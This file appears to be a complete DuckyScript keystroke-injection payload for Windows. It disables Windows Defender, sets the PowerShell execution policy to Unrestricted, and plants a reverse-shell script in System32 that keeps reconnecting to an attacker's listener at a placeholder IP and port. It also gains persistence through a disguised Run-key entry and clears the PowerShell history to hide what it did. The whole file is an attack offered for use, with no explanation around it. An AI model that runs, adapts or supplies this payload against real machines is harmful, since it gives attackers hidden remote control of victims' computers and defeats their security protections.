DELAY 200
GUI x
DELAY 500
STRING a
DELAY 5000
LEFT
DELAY 500
ENTER
DELAY 3000
STRING type nul > windowsProgram.ps1
DELAY 200
ENTER
DELAY 500
STRING powershell.exe -windowstyle hidden
DELAY 200
ENTER
DELAY 3000
STRING Set-MpPreference -DisableRealtimeMonitoring $true;New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force;Set-ExecutionPolicy Unrestricted;Start-Process notepad.exe -ArgumentList "C:\Windows\System32\windowsProgram.ps1"
DELAY 200
ENTER
DELAY 5000
REM This script ensures persistent connection and allows reconnection.
STRING while ($true) { do { Start-Sleep -Seconds 1; try { $TCPClient = New-Object Net.Sockets.TCPClient('LISTENER_IP_ADDRESS', PORT) } catch {} } until ($TCPClient.Connected); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); function WriteToStream ($String) { $prompt = "$($PWD.Path)> "; [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}; $StreamWriter.Write($String + $prompt); $StreamWriter.Flush() }; WriteToStream ''; while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); if ($Command -eq "exit") { break }; $Output = try { Invoke-Expression $Command 2>&1 | Out-String } catch { $_ | Out-String }; WriteToStream ($Output) }; $StreamWriter.Close()}
DELAY 15000
CTRL S
DELAY 500
ALT F4
DELAY 500
GUI x
DELAY 200
STRING a
DELAY 1500
LEFT
DELAY 500
ENTER
DELAY 2000
STRING powershell.exe -windowstyle hidden
DELAY 200
ENTER
DELAY 1500
STRING New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Driver Register" -Value "C:\Windows\System32\windowsProgram.ps1" -PropertyType String
DELAY 500
ENTER
DELAY 2000
STRING while ($true) { do { Start-Sleep -Seconds 1; try { $TCPClient = New-Object Net.Sockets.TCPClient('LISTENER_IP_ADDRESS', PORT) } catch {} } until ($TCPClient.Connected); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); function WriteToStream ($String) { $prompt = "$($PWD.Path)> "; [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}; $StreamWriter.Write($String + $prompt); $StreamWriter.Flush() }; WriteToStream ''; while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); if ($Command -eq "exit") { break }; $Output = try { Invoke-Expression $Command 2>&1 | Out-String } catch { $_ | Out-String }; WriteToStream ($Output) }; $StreamWriter.Close()}
DELAY 200
ENTER
GUI x
DELAY 500
STRING a
DELAY 2000
LEFT
DELAY 500
ENTER
DELAY 3000
STRING powershell
DELAY 200
ENTER
DELAY 2000
STRING Clear-History;[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"); [System.Windows.Forms.SendKeys]::Sendwait('%{F7 2}');Remove-Item (Get-PSReadlineOption).HistorySavePath;exit
DELAY 200
ENTER
DELAY 2000
STRING exit
DELAY 200
ENTER
